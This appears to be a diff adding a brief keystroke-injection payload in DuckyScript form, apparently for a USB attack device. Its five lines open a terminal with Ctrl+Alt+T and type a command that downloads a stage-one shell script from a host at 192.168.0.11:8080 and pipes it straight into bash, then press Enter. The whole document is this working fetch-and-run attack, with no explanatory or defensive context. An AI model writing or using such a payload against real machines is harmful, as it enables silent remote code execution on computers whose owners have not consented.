@@ -1,0 +1,5 @@
+DELAY 1000
+CTRL ALT t
+DELAY 800
+STRING curl -s http://192.168.0.11:8080/stage1.sh | bash
+ENTER
